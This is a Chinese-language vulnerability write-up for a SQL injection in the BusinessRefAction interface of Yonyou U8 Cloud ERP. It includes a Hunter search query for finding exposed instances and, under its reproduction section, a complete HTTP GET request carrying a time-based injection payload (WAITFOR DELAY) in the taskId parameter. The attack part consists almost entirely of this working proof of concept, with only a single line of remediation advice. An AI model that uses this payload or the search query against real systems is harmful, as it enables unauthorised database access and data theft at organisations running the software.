# 一、漏洞简介
用友U8 Cloud是用友公司推出的企业上云数字化平台，为成长型和创新型企业提供全面的云ERP解决方案。然而，该平台中存在一个安全漏洞，涉及BusinessRefAction 接口对用户输入参数缺乏有效过滤，可能导致SQL注入攻击。攻击者可通过此漏洞未经授权地访问数据库，造成潜在的信息泄露风险。建议尽快修复漏洞，强化输入验证，提升系统安全性。
# 二、影响版本

- 用友U8 Cloud
# 三、资产测绘

- hunter`app.name="用友 U8 Cloud"`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/1622799/1692444362525-121bbed1-c72d-4cad-99db-3e18509417c1.png#averageHue=%23ebcaa3&clientId=ua411923f-d5fb-4&from=paste&height=681&id=uf205e7f2&originHeight=1362&originWidth=2840&originalType=binary&ratio=2&rotation=0&showTitle=false&size=491230&status=done&style=none&taskId=u7ed064ee-8f52-4872-861a-fb7315b8b0f&title=&width=1420)

- 登录页面

![image.png](https://cdn.nlark.com/yuque/0/2023/png/1622799/1692444381978-7d4ed5bf-a153-47e5-88e6-4dd97953e976.png#averageHue=%23f9f5f5&clientId=ua411923f-d5fb-4&from=paste&height=700&id=ua5709016&originHeight=1400&originWidth=2880&originalType=binary&ratio=2&rotation=0&showTitle=false&size=314376&status=done&style=none&taskId=ud7c775d3-f67e-45fb-9234-03dc8052c11&title=&width=1440)
# 四、漏洞复现
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/1622799/1723391621567-54bad6aa-e650-4edd-be75-d9e3b7beb4e9.png#averageHue=%2375999a&clientId=udcf081bc-780f-4&from=paste&height=481&id=uafbdaea1&originHeight=962&originWidth=2232&originalType=binary&ratio=2&rotation=0&showTitle=false&size=371151&status=done&style=none&taskId=ud834cc84-3d44-492d-91a2-20a7f7bbea8&title=&width=1116)
